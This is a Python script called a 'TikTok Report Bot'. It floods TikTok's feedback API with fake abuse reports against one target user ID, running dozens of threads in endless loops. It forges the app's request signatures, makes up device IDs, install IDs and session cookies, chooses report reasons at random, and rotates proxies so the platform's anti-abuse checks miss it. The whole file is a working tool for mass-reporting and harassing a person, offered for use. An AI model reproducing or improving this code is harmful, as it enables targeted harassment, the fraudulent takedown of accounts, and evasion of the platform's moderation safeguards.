from utils.signer import Argus, Ladon, Gorgon, md5
from urllib.parse import urlencode
import requests, time, random, string, os, json, threading
G = "\033[92m" 
R = "\033[91m" 
W = "\033[0m"  
class TikTokLiteReporter:
    def __init__(self):
        self.host = "api16-normal-c-alisg.tiktokv.com"
        self.proxies = self.load_proxies()
        self.reasons = ["9002", "9007", "9004", "9008", "9003", "9005", "9013", "9001"]
    def load_proxies(self):
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r") as f:
                return [line.strip() for line in f if line.strip()]
        return []
    def hex_gen(self, length):
        return "".join(random.choices(string.hexdigits.lower(), k=length))
    def sign(self, query, payload=None):
        unix = int(time.time())
        return Gorgon(query, unix, payload, None).get_value() | {
            "x-ladon": Ladon.encrypt(unix, 1611921764, 1340),
            "x-argus": Argus.get_sign(query, None, unix, aid=1340)
        }
    def report(self, target):
        try:
            did = "759" + "".join(random.choices(string.digits, k=16))
            iid = "759" + "".join(random.choices(string.digits, k=16))
            ts = int(time.time())
            reason = random.choice(self.reasons)
            params = {
                "report_type": "user",
                "object_id": target,
                "owner_id": target,
                "reason": reason,
                "aid": "1340",
                "app_name": "musically_go",
                "version_name": "42.3.52",
                "version_code": "420352",
                "device_platform": "android",
                "device_type": "SM-S9260",
                "os_api": "32",
                "current_region": "US",
                "sys_region": "US",
                "lang": "en",
                "iid": iid,
                "device_id": did,
                "_rticket": int(ts * 1000),
                "ts": ts
            }
            query_str = urlencode(params)
            headers = {
                "host": self.host,
                "x-ss-dp": "1340",
                "x-tt-ultra-lite": "1",
                "user-agent": "com.tiktok.lite.go/420352 (Linux; U; Android 12; en_US; SM-S9260; Build/V417IR;tt-ok/3.12.13.44.lite-ul)",
                "cookie": f"install_id={iid}; device_id={did}; sessionid={self.hex_gen(32)};",
                "accept-encoding": "gzip"
            }
            headers.update(self.sign(query_str))
            url = f"https://{self.host}/aweme/v2/aweme/feedback/?{query_str}"
            proxy = None
            if self.proxies:
                px = random.choice(self.proxies)
                proxy = {"http": px, "https": px}
            r = requests.get(url, headers=headers, proxies=proxy, timeout=5)
            if r.status_code == 200:
                print(f"{G}[SUCCESS]{W} Reason: {reason} | ID: {r.json().get('log_pb', {}).get('impr_id', 'N/A')}")
            else:
                pass

        except:
            pass

def worker(bot, target):
    while True:
        bot.report(target)
if __name__ == "__main__":
    bot = TikTokLiteReporter()
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{G}--- TikTok Report Bot | @WHI3PER ---{W}")
    target_id = input("Target User ID: ")
    threads_count = int(input("Threads (Recommended 20-50): "))
    print(f"\n{G}[🚀] Attacking {target_id} with maximum speed...{W}\n")
    for _ in range(threads_count):
        threading.Thread(target=worker, args=(bot, target_id), daemon=True).start()
    while True:
        try: time.sleep(1)
        except KeyboardInterrupt: break